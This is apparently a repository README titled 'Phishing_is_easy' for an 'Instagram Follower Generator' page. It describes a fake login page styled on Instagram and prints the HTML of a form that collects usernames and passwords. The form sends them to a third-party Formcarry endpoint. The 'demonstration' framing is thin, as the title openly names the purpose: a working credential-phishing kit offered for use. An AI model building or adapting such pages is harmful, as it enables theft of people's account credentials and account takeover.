# Phishing_is_easy
Phising with html, css and js.
----------------------------------------------------------

# Instagram Follower Generator

This project is a simple frontend interface designed to demonstrate how to collect user input (e.g., username, email, and password) and submit it to a custom API using the [Formcarry](https://formcarry.com/) service. This project also demonstrates an aesthetic, responsive UI inspired by social media login pages.

## Features

- A visually appealing login form.
- Input validation for required fields (username/email and password).
- Feedback messages displayed dynamically during the form submission process.
- Mobile-friendly and responsive design.
- Integrated with [Formcarry](https://formcarry.com/) to handle form submissions.

---

## Code Overview

### Login Form

The form utilizes the `POST` method to submit user data to a custom Formcarry API. Below is the structure of the form:
```html
<form action="https://formcarry.com/s/9lSlwjAKkAg" method="POST" id="login-post">
  <div class="inputs-container">
    <input type="text" id="username" name="username" placeholder="Phone number, username or email" required>
  </div>
  <div class="inputs-container">
    <input type="password" id="password" name="password" placeholder="Password" required>
  </div>
  <button type="submit" class="login-button">Log In</button>
  <div id="feedback" style="color: red; margin-top: 10px;"></div>
</form>
